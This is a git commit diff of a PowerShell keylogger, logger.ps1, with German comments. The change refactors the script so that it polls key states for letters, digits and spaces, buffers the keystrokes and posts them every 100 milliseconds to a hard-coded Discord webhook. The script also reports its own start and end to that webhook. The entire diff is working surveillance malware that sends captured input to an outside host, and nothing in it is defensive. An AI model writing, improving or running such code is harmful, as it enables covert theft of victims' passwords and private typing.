068757244a462f92b1759d9e2e98b66df37fd10e
Lukas Pierchalla <git@l.pierchalla.de>
2025-10-29 15:26:50 +0100

    refactor logger script to optimize key handling and improve buffer management

--- logger.ps1
+++ logger.ps1
@@ -15,14 +15,8 @@ $hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyys
 # Zeitmessung beginnen
 $start = Get-Date
 $timeout = 120 # Sekunden
-
-# Virtual Key Codes
-$VK_SPACE = 0x20     # Leerzeichen
-$VK_RETURN = 0x0D    # Enter
-$VK_BACK = 0x08      # Backspace
-$VK_TAB = 0x09       # Tab
-$VK_SHIFT = 0x10     # Shift
-$VK_CAPITAL = 0x14   # Caps Lock
+$lastSend = Get-Date
+$buffer = ""
 
 # Logger-Start an Discord melden
 try {
@@ -35,64 +29,47 @@ while ($true) {
         break
     }
 
-    # Shift und Caps Lock Status prüfen
-    $shift = [Keyboard]::GetAsyncKeyState($VK_SHIFT) -band 0x8000
-    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-
-    # Prüfe spezielle Tasten
-    if ([Keyboard]::GetAsyncKeyState($VK_SPACE) -eq -32767) {
-        try {
-            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=" "}|ConvertTo-Json) -ContentType "application/json"
-        } catch {}
-        continue
-    }
-    if ([Keyboard]::GetAsyncKeyState($VK_RETURN) -eq -32767) {
-        try {
-            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="`n"}|ConvertTo-Json) -ContentType "application/json"
-        } catch {}
-        continue
-    }
-    if ([Keyboard]::GetAsyncKeyState($VK_BACK) -eq -32767) {
-        try {
-            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[BACK]"}|ConvertTo-Json) -ContentType "application/json"
-        } catch {}
-        continue
-    }
-    if ([Keyboard]::GetAsyncKeyState($VK_TAB) -eq -32767) {
-        try {
-            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="`t"}|ConvertTo-Json) -ContentType "application/json"
-        } catch {}
-        continue
+    # Prüfe Leerzeichen
+    if ([Keyboard]::GetAsyncKeyState(0x20) -eq -32767) {
+        $buffer += " "
     }
 
     # Prüfe Buchstaben (A-Z)
     foreach ($vkey in 65..90) {
         if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
+            $shift = [Keyboard]::GetAsyncKeyState(0x10)
+            $caps = [Console]::CapsLock
             $char = [char]$vkey
-            # Groß-/Kleinschreibung basierend auf Shift und Caps Lock
-            if (!($shift -xor $caps)) {
+            if (!($shift -eq -32768 -xor $caps)) {
                 $char = $char.ToString().ToLower()
             }
-            try {
-                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$char}|ConvertTo-Json) -ContentType "application/json"
-            } catch {}
+            $buffer += $char
         }
     }
 
     # Prüfe Zahlen (0-9)
     foreach ($vkey in 48..57) {
         if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
-            try {
-                if ($shift) {
-                    $shiftNums = @(')','!','@','#','$','%','^','&','*','(')
-                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$shiftNums[$vkey-48]}|ConvertTo-Json) -ContentType "application/json"
-                } else {
-                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=[char]$vkey}|ConvertTo-Json) -ContentType "application/json"
-                }
-            } catch {}
+            $buffer += [char]$vkey
         }
     }
-    Start-Sleep -Milliseconds 1  # Kürzere Verzögerung für besseres Ansprechverhalten
+
+    # Sende Buffer alle 100ms
+    $now = Get-Date
+    if ($buffer.Length -gt 0 -and ($now - $lastSend).TotalMilliseconds -ge 100) {
+        try {
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType "application/json"
+            $buffer = ""
+            $lastSend = $now
+        } catch {}
+    }
+}
+
+# Sende restlichen Buffer
+if ($buffer.Length -gt 0) {
+    try {
+        Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType "application/json"
+    } catch {}
 }
 
 # Logger-Ende an Discord melden
